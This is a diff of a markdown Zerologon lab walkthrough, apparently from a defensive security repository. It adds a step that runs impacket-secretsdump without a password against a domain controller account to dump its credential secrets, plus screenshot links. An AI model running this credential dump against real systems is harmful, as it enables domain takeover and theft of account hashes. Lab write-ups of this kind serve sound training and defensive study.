@@ -41,7 +41,10 @@ To get domain name: <br />
 
 Running script against our vulnerable domain controller: <br />
 ![alt text](https://github.com/secjedi/CyberDefense/blob/main/Images/zerologon/2.png) <br />
-
+Now, to pull the secret off the target machine: <br />
+`└─$ impacket-secretsdump -just-dc -no-pass DC01\$@10.10.25.29                                                                                                                                   130 ⨯
+`
+![alt text](https://github.com/secjedi/CyberDefense/blob/main/Images/zerologon/5.png) <br />
 
 
 
